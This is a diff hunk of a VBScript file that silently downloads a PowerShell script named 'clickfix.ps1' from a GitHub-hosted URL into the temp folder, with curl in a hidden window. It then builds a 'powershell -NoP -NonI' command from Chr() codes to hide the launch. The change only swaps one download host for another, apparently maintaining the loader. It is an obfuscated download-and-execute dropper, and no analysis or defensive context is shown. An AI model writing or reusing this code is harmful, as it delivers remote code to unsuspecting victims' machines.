@@ -8,7 +8,7 @@ Set s = CreateObject("WScript.Shell")
 Set f = CreateObject("Scripting.FileSystemObject")
 t = f.GetSpecialFolder(2)
 p = t & "\c.ps1"
-u = "https://kai195102.github.io/d/clickfix.ps1"
+u = "https://raw.githubusercontent.com/kai195102/d/main/clickfix.ps1"
 s.Run "curl -sLo """ & p & """ """ & u & """", 0, True
 a = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)
 a = a & Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(110)&Chr(73)
